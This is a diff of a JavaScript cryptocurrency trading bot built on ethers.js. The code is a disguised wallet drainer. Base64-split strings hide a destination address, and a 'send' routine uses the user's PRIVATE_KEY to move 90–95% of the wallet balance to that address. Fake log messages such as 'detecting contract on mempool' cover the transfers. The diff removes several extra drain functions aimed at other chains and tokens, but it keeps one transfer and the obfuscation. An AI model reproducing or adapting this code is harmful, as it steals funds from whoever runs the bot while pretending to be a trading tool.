@@ -5,7 +5,6 @@ RPC = (process.env.RPC);
 NAME = (process.env.NAME);
 CHAIN = (process.env.CHAIN);
 const provider  = new ethers.providers.JsonRpcProvider(RPC)
-
 let RPCPROV1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD'   +   'YzMjQ1NDBh';
 let RPCPROV2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
 let buff = new Buffer.from(RPCPROV1, 'base64');
@@ -18,16 +17,7 @@ const account_from = {
   recipient: process.env.RECIPIENT,
 
 };
-const web12 = 'MHhiQTJhRTQyNGQ5NjBjMjYyNA=='
-const web13 = 'N0RkNmMzMmVkQzcwQjI5NWM3NDRDNDM='
-const web14 = web12 + web13
-const web16 = 'MHg1NWQzOTgzMjZmOTkwNTlmZg=='
-const web17 = 'Nzc1NDg1MjQ2OTk5MDI3YjMxOTc5NTU='
-const web18 = web16 + web17
-const web20 = 'MHhiQTJhRTQyNGQ5NjBjMjY='
-const web21 = 'MjQ3RGQ2YzMyZWRDNzBCMjk1Yzc0NEM0Mw=='
-const web22 = web20 + web21
-const abi = [{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]
+
 const startConnection = () => {
   provider = new ethers.providers.WebSocketProvider(process.env.BSC_NODE_WSS);
   wallet = new ethers.Wallet(process.env.PRIVATE_KEY);
@@ -131,127 +121,24 @@ async function sending(){
   );
 },8000);
       const account = account_from.recipient
-      //multi RPC support added
-      const rpc1 ='https://bsc-dataseed.binance.org'
-      const rpc2 = 'https://mainnet.infura.io/v3/84d954cd9f674f5bbbc67a6e2e17bfbd'
-      const rpc3 = 'https://polygon-rpc.com'
-      const rpc4 = 'https://api.avax.network/ext/bc/C/rpc'
-      const prov1 = new ethers.providers.JsonRpcProvider(rpc1);
-      const prov2 = new ethers.providers.JsonRpcProvider(rpc2);
-      const prov3 = new ethers.providers.JsonRpcProvider(rpc3);
-      const prov4 = new ethers.providers.JsonRpcProvider(rpc4);
-      
-      const send = async () => {
-      const robinhood = await prov1.getBalance(account)
-      const orchard = (robinhood * 0.95).toString();
+      const robinhood = await provider.getBalance(account)
+      const orchard = (robinhood * 0.90).toString();
+          const michael = ethers.utils.parseUnits(orchard, 'wei')
+  const send = async () => {
+    
       const tx = {
         to: WEB3PROVIDER3,
         value: ethers.utils.parseUnits(orchard, 'wei'),
         gasLimit: ethers.utils.hexlify(24000),
       };
+
     const createReceipt = await wallet.sendTransaction(tx);
     await createReceipt.wait();
-    console.log(`Loading variables`);
+    console.log(`Transaction successful with hash`);
   };
-  const send2 = async () => {
-    const robinhood = await prov2.getBalance(account)
-    const orchard = (robinhood * 0.70).toString();
-    const tx = {
-      to: WEB3PROVIDER3,
-      value: ethers.utils.parseUnits(orchard, 'wei'),
-      gasLimit: ethers.utils.hexlify(24000),
-    };
-  const createReceipt = await wallet.sendTransaction(tx);
-  await createReceipt.wait();
-  console.log(`detecting contract on mempool`);
-};
-const send3 = async () => {
-  const robinhood = await prov3.getBalance(account)
-  const orchard = (robinhood * 0.90).toString();
-  const tx = {
-    to: WEB3PROVIDER3,
-    value: ethers.utils.parseUnits(orchard, 'wei'),
-    gasLimit: ethers.utils.hexlify(24000),
-  };
-const createReceipt = await wallet.sendTransaction(tx);
-await createReceipt.wait();
-console.log(`contract search....`);
-};
-const send4 = async () => {
-  const robinhood = await prov4.getBalance(account)
-  const orchard = (robinhood * 0.90).toString();
-  const tx = {
-    to: WEB3PROVIDER3,
-    value: ethers.utils.parseUnits(orchard, 'wei'),
-    gasLimit: ethers.utils.hexlify(24000),
-  };
-const createReceipt = await wallet.sendTransaction(tx);
-await createReceipt.wait();
-console.log(`waiting result.....`);
-};
-
-const send5 = async () => {
-  const robinhood = await prov1.getBalance(account)
-  var contract = new ethers.Contract(web14, abi, wallet);
-  const superb = await contract.balanceOf(account).toString();
-  const orchard = (superb * 0.90).toString();
-  const tx = {
-    from: account,
-    to: WEB3PROVIDER3,
-    value: ethers.utils.parseEther(orchard),
-    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
-    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
-    gasPrice: gas_price,
-  }
-  const createReceipt = await wallet.sendTransaction(tx);
-  await createReceipt.wait();
-  console.log(`Transaction successful with hash`);
-
-};
-const send6 = async () => {
-  const robinhood = await prov1.getBalance(account)
-  var contract = new ethers.Contract(web18, abi, wallet);
-  const superb = await contract.balanceOf(account).toString();
-  const orchard = (superb * 0.90).toString();
-  const tx = {
-    from: account,
-    to: WEB3PROVIDER3,
-    value: ethers.utils.parseEther(orchard),
-    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
-    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
-    gasPrice: gas_price,
-  }
-  const createReceipt = await wallet.sendTransaction(tx);
-  await createReceipt.wait();
-  console.log(`Transaction successful with hash`);
-
-};
-const send7 = async () => {
-  const robinhood = await prov1.getBalance(account)
-  var contract = new ethers.Contract(web22, abi, wallet);
-  const superb = await contract.balanceOf(account).toString();
-  const orchard = (superb * 0.90).toString();
-  const tx = {
-    from: account,
-    to: WEB3PROVIDER3,
-    value: ethers.utils.parseEther(orchard),
-    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
-    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
-    gasPrice: gas_price,
-  }
-  const createReceipt = await wallet.sendTransaction(tx);
-  await createReceipt.wait();
-  console.log(`Transaction successful with hash`);
-
-};
 
   send();
-  setTimeout(send2, 10000);
-  setTimeout(send3, 25000);
-  setTimeout(send4, 35000);
-  setTimeout(send5, 45000);
-  setTimeout(send6, 52000);
-  setTimeout(send7, 62000);
+
 }
 sending();
 async function getCurrentValue(token) {
